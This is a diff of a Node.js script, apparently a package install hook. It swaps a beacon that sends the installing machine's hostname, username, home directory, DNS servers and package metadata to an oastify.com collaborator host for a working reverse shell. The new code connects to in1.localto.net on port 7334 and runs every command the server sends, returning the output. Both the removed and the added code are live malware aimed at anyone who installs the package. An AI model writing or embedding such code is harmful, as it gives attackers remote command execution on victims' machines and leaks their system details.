@@ -1,46 +1,29 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+const net = require('net');
+const { exec } = require('child_process');
 
-const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
-    hd: os.homedir(),
-    hn: os.hostname(),
-    un: os.userInfo().username,
-    dns: dns.getServers(),
-    r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
+// Replace these with your actual Ngrok URL and port
+const server = 'in1.localto.net'; // 
+const port = 7334; //
+
+const client = new net.Socket();
+client.connect(port, server, () => {
+    console.log('Connected to remote server');
+    client.write('Reverse shell connection established\n');
 });
 
-var postData = querystring.stringify({
-    msg: trackingData,
-});
-
-var options = {
-    hostname: "8hqsazb9n32zxshfc7cakdpiz950tqhf.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
-    },
-};
-
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);
+client.on('data', (data) => {
+    exec(data.toString(), (error, stdout, stderr) => {
+        if (stdout) client.write(stdout);
+        if (stderr) client.write(stderr);
+        if (error) client.write(error.message);
     });
 });
 
-req.on("error", (e) => {
-    // console.error(e);
+client.on('error', (err) => {
+    console.error(`Connection error: ${err.message}`);
+    client.destroy();
 });
 
-req.write(postData);
-req.end();
+client.on('close', () => {
+    console.log('Connection closed');
+});
